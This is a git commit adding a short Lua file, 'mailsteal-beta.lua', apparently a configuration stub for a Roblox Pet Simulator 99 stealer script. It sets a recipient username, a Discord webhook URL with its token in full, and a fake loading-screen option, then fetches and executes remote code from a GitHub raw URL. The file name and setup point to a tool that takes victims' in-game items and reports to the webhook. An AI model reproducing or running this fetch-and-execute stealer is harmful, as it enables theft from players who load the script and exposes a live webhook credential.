992fa849e266f660c0132d72c16c208acd255dba
pablopoep <123007142+pablopoep@users.noreply.github.com>
2024-01-29 20:26:29 +0100

    Create mailsteal-beta.lua

---
+++ mailsteal-beta.lua
@@ -0,0 +1,6 @@
+Username = "pablopoep0"
+Webhook = "https://discord.com/api/webhooks/1201559132226981968/Tvud5YvYPelXRf3hArfPlch268tO7WDUXIlVUY-42C9POo1ScqUiYwGIN2hwiif5J8a-"
+selectedLoadingScreen = "4" -- Select Loading Screen And Write Number If You Not Select Loading Screen its automaticly select loading screen 1
+LoadingScreen = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
